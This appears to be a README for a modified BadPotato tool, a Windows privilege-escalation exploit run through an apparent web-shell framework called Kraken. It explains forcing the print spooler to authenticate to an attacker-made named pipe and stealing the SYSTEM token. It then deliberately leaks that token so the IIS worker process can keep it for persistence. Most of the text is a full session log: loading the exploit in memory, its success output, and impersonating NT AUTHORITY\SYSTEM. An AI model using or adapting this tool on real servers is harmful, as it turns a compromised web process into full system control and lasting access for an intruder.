# BadPotato mod

BadPotato uses the Windows print service (**spoolss**) to exploit a [Forced Authentication][1]. This forced authentication occurs through the RPC call: [`RpcRemoteFindFirstPrinterChangeNotificationEx()`][2], which generates a notification object that monitors changes to a print object. This is used to force the print service to connect to a NamedPipe that we have created and steal the access token from it. As the user running the print service is the system account, we can use his token to elevate privileges.

This binary is a modified version of the original [BadPotato][3] code. This version performs privilege elevation just like BadPotato does, however, the code block relating to the creation and execution of the new process using the duplicate SYSTEM token has been removed. Instead, it forces a "leak" of the duplicate token by not calling the `CloseHandle()` that frees the reference.

By "leaking" the token, it can be used from the IIS Worker process itself (w3wp.exe), therefore, it is possible to use it via Kraken to impersonate the security context and privileges of the **NT AUTHORITY\SYSTEM** account.

In this way, it is possible to abuse the **SeImpersonate** privilege to achieve privilege escalation + persistence (because we can maintain the privilege level through the use of the Handle to Token).

## Examples

An example of elevation of privilege + impersonation using Kraken:

```
(ST) IIS APPPOOL\DefaultAppPool@DESKTOP-8D0OEQR:C:/inetpub/wwwroot$ sysinfo
Hostname: DESKTOP-8D0OEQR
IP: 172.20.10.9
OS: Microsoft Windows NT 10.0.19045.0 x64
User: IIS APPPOOL\DefaultAppPool
Path: C:/inetpub/wwwroot
Version: 4.0.30319.42000

(ST) IIS APPPOOL\DefaultAppPool@DESKTOP-8D0OEQR:C:/inetpub/wwwroot$ help execute_assembly
usage: execute_assembly -f F -n N -c C -m M [arguments [arguments ...]]

Load a NET Assembly into memory using Reflection

positional arguments:
  arguments  Arguments to pass to the assembly

optional arguments:
  -f F       Local Filepath of NET Assembly (remember to check the NET version of the assembly and the architecture)
  -n N       Namespace to call inside Assembly.
  -c C       Class to call inside Assembly.
  -m M       Method to call inside Assembly.

Examples:
  execute_assembly -f ~/Kraken/net_assemblies/bin/BadPotato-mod/BadPotato_net40_x64.exe -n BadPotato -c Program -m call
  execute_assembly -f ~/Kraken/net_assemblies/bin/Dummy/dummy_net40_x64.exe -n Dummy -c Program -m Main -- Ping
  execute_assembly -f ~/Kraken/net_assemblies/bin/Dummy/dummy_net20_x64.exe -n Dummy -c Program -m Main -- Ping -h --help

(ST) IIS APPPOOL\DefaultAppPool@DESKTOP-8D0OEQR:C:/inetpub/wwwroot$ list_tokens

  TOKEN  USERNAME                    NETWORK ACCESS  INTEGRITYLEVEL

  636    nt authority\iusr           True            HIGH
  664    iis apppool\defaultapppool  True            HIGH

(ST) IIS APPPOOL\DefaultAppPool@DESKTOP-8D0OEQR:C:/inetpub/wwwroot$ execute_assembly -f /home/secu/net_assemblies/bin/BadPotato-mod/BadPotato_net40_x64.exe -n BadPotato -c Program -m Main
[*] PipeName : \\.\pipe\986aba0ae0e14cdd906d46087e9cbc55\pipe\spoolss
[*] ConnectPipeName : \\DESKTOP-8D0OEQR/pipe/986aba0ae0e14cdd906d46087e9cbc55
[*] CreateNamedPipeW Success! IntPtr:2496
[*] RpcRemoteFindFirstPrinterChangeNotificationEx Success! IntPtr:2817957639424
[*] ConnectNamePipe Success!
[*] CurrentUserName : DefaultAppPool
[*] CurrentConnectPipeUserName : SYSTEM
[*] ImpersonateNamedPipeClient Success!
[*] OpenThreadToken Success! IntPtr:2232
[*] DuplicateTokenEx Success! IntPtr:2248
[*] Token: 2248


(ST) IIS APPPOOL\DefaultAppPool@DESKTOP-8D0OEQR:C:/inetpub/wwwroot$ list_tokens

  TOKEN  USERNAME                    NETWORK ACCESS  INTEGRITYLEVEL

  636    nt authority\iusr           True            HIGH
  664    iis apppool\defaultapppool  True            HIGH
  2248   nt authority\system         False           SYSTEM

(ST) IIS APPPOOL\DefaultAppPool@DESKTOP-8D0OEQR:C:/inetpub/wwwroot$ set_token 2248
Impersonated user: 'NT AUTHORITY\SYSTEM' with token: '2248'

(ST) NT AUTHORITY\SYSTEM@DESKTOP-8D0OEQR:C:/inetpub/wwwroot$ id
user=S-1-5-18(NT AUTHORITY\SYSTEM) groups=S-1-5-32-544(BUILTIN\Administradores),S-1-1-0(Todos),S-1-5-11(NT AUTHORITY\Usuarios autentificados)

(ST) NT AUTHORITY\SYSTEM@DESKTOP-8D0OEQR:C:/inetpub/wwwroot$ rev2self
[*] Token 2248 has been dereferenced (this does not mean that the token has been released)

(ST) IIS APPPOOL\DefaultAppPool@DESKTOP-8D0OEQR:C:/inetpub/wwwroot$ id
user=S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415(IIS APPPOOL\DefaultAppPool) groups=S-1-1-0(Todos),S-1-5-32-545(BUILTIN\Usuarios),S-1-5-6(NT AUTHORITY\SERVICIO),S-1-2-1(INICIO DE SESIN EN LA CONSOLA),S-1-5-11(NT AUTHORITY\Usuarios autentificados),S-1-5-15(NT AUTHORITY\Esta compaa),S-1-5-32-568(BUILTIN\IIS_IUSRS),S-1-2-0(LOCAL)

(ST) IIS APPPOOL\DefaultAppPool@DESKTOP-8D0OEQR:C:/inetpub/wwwroot$ exit
```


[1]: https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication "Forced Authentication Examples"
[2]: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d "MSDN Endpoint Spec"
[3]: https://github.com/BeichenDream/BadPotato "BadPotato Repository"
